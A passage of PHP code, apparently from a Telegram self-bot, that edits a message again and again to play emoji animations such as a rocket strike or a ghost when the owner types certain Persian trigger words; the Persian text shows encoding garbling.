                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                โข  ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐               โข   ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              โข    ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐             โข     ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            โข      ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           โข       ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          โข        ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         โข         ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        โข          ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       โข           ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      โข            ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     โข             ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    โข              ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   โข               ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  โข                ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ โข                 ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐โข                  ๐ซ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐คฏ                  ๐ซ ๐ถ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุฎุง?ูุงู ุดูุงุณุง?? ุดุฏ ู ฺฉุดุชู ุดุฏ :)"]);
                    }
                    if ($text == 'ุขุฏู ูุถุง??') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ                     ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ                    ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ                   ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ                  ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ                 ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ                ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ               ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ              ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ             ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ            ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ           ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ          ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ         ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ        ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ       ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ      ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ     ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ    ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ   ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ  ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ ๐ฆ๐ผ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฝ๐ฆ๐"]);
                    }
                    if ($text == 'ููุดฺฉ' or $text == 'ุญููู' or $text == 'ุณู?ูู ุจุชุฑฺฉูู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                                ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                               ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                              ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                             ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                            ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                           ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                          ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                         ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                        ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                       ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                      ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                     ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                   ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                  ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                 ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐                ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐               ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐              ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐            ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐           ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐          ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐         ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐        ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐       ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐      ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐     ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐    ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐   ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐  ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ ๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐๐ธ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ฅBoom๐ฅ"]);
                    }
                    if ($text == 'ูพูู' or $text == 'ุฏูุงุฑ' or $text == 'ุงุฑุจุงุจ ุดูุฑ ูู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ                    ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ                   ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ                 ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ                ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ               ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ              ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ             ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ            ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ           ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ          ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ                     ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ        ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ       ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ      ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ     ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ    ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ   ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ  ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ            โ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ           ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ          ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ         ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ        ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ       ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ      ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ     ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ    ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ   ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ  ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฅ ๐ต"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ธ"]);
                    }
                    if ($text == 'ุจุง ฺฉุงุฑุง? ุช ุจุง?ุฏ ฺุงูุด ุณุน? ฺฉู ูุฑ?ู? ุจุฒุงุฑู' or $text == 'ุฎุฒูุฎ?ู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ               ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ              ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ             ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ            ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ           ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ          ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ         ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ        ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ       ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ      ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ     ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ    ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ   ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ  ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฉ ๐คข"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐คฎ๐คฎ"]);
                    }
                    if ($text == 'ุฌู' or $text == 'ุฑูุญ' or $text == 'ุฑูุญุญ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                                   ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                                  ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                                 ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                                ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                               ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                              ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                             ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                           ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                          ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                         ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                        ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                       ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                      ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                     ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                    ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                   ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                  ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป                 ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป               ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป              ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป             ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป           ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป          ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป         ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป        ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป       ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป      ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป     ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป    ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป   ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป  ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ป๐ฟ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ ุฑูุญ ุฏ?ุฏ ู ุณฺฉุชู ฺฉุฑุฏโ "]);
                    }
                    if ($text == 'ุจุฑู ุฎููู' or $text == 'ุฑุณ?ุฏู ุฎููู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐               ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐             ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐  ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ุฑุณ?ุฏ?ู ู ุฑุณ?ุฏ?ู ฺฉุงุดฺฉ? ูู?ุฑุณ?ุฏ?ู"]);
                    }
                    if ($text == 'ฺฉุฑุฌ' or $text == 'karaj') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐-----------------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐----------------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐---------------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐--------------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐-------------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐------------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐-----------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐----------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐---------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐--------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐-------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐------๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐-----๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐----๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐---๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐--๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐-๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ฺฉุฑุฌ๐ค"]);
                    }


                    if ($text == 'ูุฑุงุฑ ุงุฒ ุฎููู' or $text == 'ุดฺฉุณุช ุนุดู?') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก  ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก   ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก    ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก     ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก      ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก       ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก        ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก         ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก          ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก           ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก            ๐"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก              ๐๐๐ซ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก                 ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก               ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก             ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก           ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก         ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก       ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก     ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก  ๐ถโโ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ก๐ถโโ"]);
                    }
                    if ($text == 'ุนูุงุจ' or $text == 'ุง?ฺฏู' or $text == 'ูพ?ุด? ุจุฑุฏ') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                         ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                       ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                     ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                   ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                 ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐                ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐              ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐            ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐           ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐          ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐         ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐        ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐       ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐      ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐     ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐    ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐   ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ ๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ฆ"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ูพ?ุด? ุจุฑุฏ๐น"]);
                    }
                    if ($text == 'ุญููู' or $text == 'ุญูุงู' or $text == 'ุญูููู') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช                  ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช                 ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช                ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช              ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช             ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช            ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช           ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช          ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช         ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช        ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช       ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช      ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช     ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช    ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช   ๐๐ค"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐๐ช  ๐๐ค"]);
